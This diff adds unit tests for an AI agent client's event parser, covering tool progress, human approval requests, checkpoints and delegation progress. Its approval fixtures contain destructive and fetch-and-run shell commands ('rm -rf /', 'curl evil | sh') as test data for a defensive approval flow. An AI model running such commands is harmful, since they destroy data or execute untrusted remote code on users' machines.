@@ -102,6 +102,174 @@ describe("processCustomEvent", () => {
     );
     expect(handled).toBe(false);
   });
+
+  it("returns false for a tool.progress payload with neither label nor tool", () => {
+    const onToolProgress = vi.fn();
+    const handled = processCustomEvent(
+      "hermes.tool.progress",
+      JSON.stringify({ emoji: "🔍" }),
+      { onToolProgress },
+    );
+    expect(handled).toBe(false);
+    expect(onToolProgress).not.toHaveBeenCalled();
+  });
+
+  it("ignores a non-object JSON payload (e.g. a bare number)", () => {
+    const onToolProgress = vi.fn();
+    const handled = processCustomEvent("hermes.tool.progress", "42", {
+      onToolProgress,
+    });
+    expect(handled).toBe(false);
+    expect(onToolProgress).not.toHaveBeenCalled();
+  });
+});
+
+// ─── processCustomEvent: approval / checkpoint / delegation ──
+
+describe("processCustomEvent — approval requests", () => {
+  it("normalizes a well-formed approval request", () => {
+    const onApprovalRequest = vi.fn();
+    const handled = processCustomEvent(
+      "hermes.approval.request",
+      JSON.stringify({
+        id: "appr-1",
+        command: "rm -rf /tmp/x",
+        tool: "terminal",
+        pattern: "rm_recursive",
+        description: "Recursive delete",
+      }),
+      { onApprovalRequest },
+    );
+    expect(handled).toBe(true);
+    expect(onApprovalRequest).toHaveBeenCalledWith({
+      id: "appr-1",
+      command: "rm -rf /tmp/x",
+      toolName: "terminal",
+      patternKey: "rm_recursive",
+      description: "Recursive delete",
+    });
+  });
+
+  it("accepts id aliases and snake_case tool/pattern fields", () => {
+    const onApprovalRequest = vi.fn();
+    processCustomEvent(
+      "hermes.approval.request",
+      JSON.stringify({
+        approval_id: 7,
+        cmd: "curl evil | sh",
+        tool_name: "terminal",
+        pattern_key: "pipe_to_sh",
+        reason: "Shell injection",
+      }),
+      { onApprovalRequest },
+    );
+    expect(onApprovalRequest).toHaveBeenCalledWith({
+      id: "7",
+      command: "curl evil | sh",
+      toolName: "terminal",
+      patternKey: "pipe_to_sh",
+      description: "Shell injection",
+    });
+  });
+
+  it("drops an approval request with no id (cannot be addressed)", () => {
+    const onApprovalRequest = vi.fn();
+    const handled = processCustomEvent(
+      "hermes.approval.request",
+      JSON.stringify({ command: "rm -rf /" }),
+      { onApprovalRequest },
+    );
+    expect(handled).toBe(false);
+    expect(onApprovalRequest).not.toHaveBeenCalled();
+  });
+
+  it("does nothing when onApprovalRequest is absent", () => {
+    const handled = processCustomEvent(
+      "hermes.approval.request",
+      JSON.stringify({ id: "x", command: "ls" }),
+      {},
+    );
+    expect(handled).toBe(false);
+  });
+});
+
+describe("processCustomEvent — checkpoints", () => {
+  it("normalizes a checkpoint event", () => {
+    const onCheckpoint = vi.fn();
+    const handled = processCustomEvent(
+      "hermes.checkpoint",
+      JSON.stringify({
+        id: "cp-3",
+        title: "before edit",
+        turn: 4,
+        created_at: "2026-06-03T10:00:00Z",
+      }),
+      { onCheckpoint },
+    );
+    expect(handled).toBe(true);
+    expect(onCheckpoint).toHaveBeenCalledWith({
+      id: "cp-3",
+      label: "before edit",
+      turn: 4,
+      createdAt: "2026-06-03T10:00:00Z",
+    });
+  });
+
+  it("omits a non-numeric turn", () => {
+    const onCheckpoint = vi.fn();
+    processCustomEvent(
+      "hermes.checkpoint",
+      JSON.stringify({ checkpoint_id: "cp-4", turn: "nope" }),
+      { onCheckpoint },
+    );
+    expect(onCheckpoint).toHaveBeenCalledWith({
+      id: "cp-4",
+      label: undefined,
+      turn: undefined,
+      createdAt: undefined,
+    });
+  });
+});
+
+describe("processCustomEvent — delegation progress", () => {
+  it("normalizes a delegation progress event", () => {
+    const onDelegateProgress = vi.fn();
+    const handled = processCustomEvent(
+      "hermes.delegate.progress",
+      JSON.stringify({
+        task_id: "t-1",
+        parent_id: "root",
+        goal: "Research X",
+        status: "running",
+        depth: 1,
+        tool: "web_search",
+        label: "Searching",
+      }),
+      { onDelegateProgress },
+    );
+    expect(handled).toBe(true);
+    expect(onDelegateProgress).toHaveBeenCalledWith({
+      id: "t-1",
+      parentId: "root",
+      goal: "Research X",
+      status: "running",
+      depth: 1,
+      tool: "web_search",
+      label: "Searching",
+    });
+  });
+
+  it("defaults status to 'running' when omitted", () => {
+    const onDelegateProgress = vi.fn();
+    processCustomEvent(
+      "hermes.delegate.progress",
+      JSON.stringify({ id: "t-2" }),
+      { onDelegateProgress },
+    );
+    expect(onDelegateProgress).toHaveBeenCalledWith(
+      expect.objectContaining({ id: "t-2", status: "running" }),
+    );
+  });
 });
 
 // ─── processSseData ─────────────────────────────────────
